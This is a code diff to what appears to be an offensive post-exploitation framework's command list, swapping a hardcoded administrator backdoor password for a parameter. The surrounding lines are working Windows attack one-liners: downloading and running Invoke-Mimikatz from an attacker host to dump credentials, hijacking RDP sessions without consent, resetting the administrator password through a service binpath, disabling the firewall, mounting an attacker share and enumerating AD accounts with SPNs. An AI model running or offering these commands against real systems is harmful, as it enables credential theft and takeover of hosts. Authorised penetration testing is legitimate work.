@@ -169,7 +169,7 @@ class PostexpMigratedCommandSet(LazyOwnCommandSet):
             ("WIN tscon active session id 2", "tscon 2 /dest:console"),
             ("WIN shado hijack session id 2 rdp", "mstsc /shadow:2 /noconsentprompt /control /v:dc1_host"),
             ("WIN Mimikatz ps1", f"IEX (New-Object Net.WebClient).DownloadString('http://{self.params['lhost']}/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"),
-            ("WIN sc.exe change admin pass", 'sc.exe config browser binpath="C:\\windows\\system32\\cmd.exe /c net user administrator Grisgrisgris123!"'),
+            ("WIN sc.exe change admin pass", f'sc.exe config browser binpath="C:\\windows\\system32\\cmd.exe /c net user administrator {self.params.get("backdoor_password", "CHANGE_ME")}"'),
             ("WIN firewall off", "netsh advfirewall set allprofiles state off"),
             ("WIN net use share", f"net.exe use T: \\\\{self.params['lhost']}\\share /user:test test"),
             ("WIN AD Enum", "('AD_Computers: {0}' -f ([adsiSearcher]'(ObjectClass=computer)').FindAll().count); ([adsisearcher]'(&(objectCategory=user)(servicePrincipalName=*))').FindAll()"),
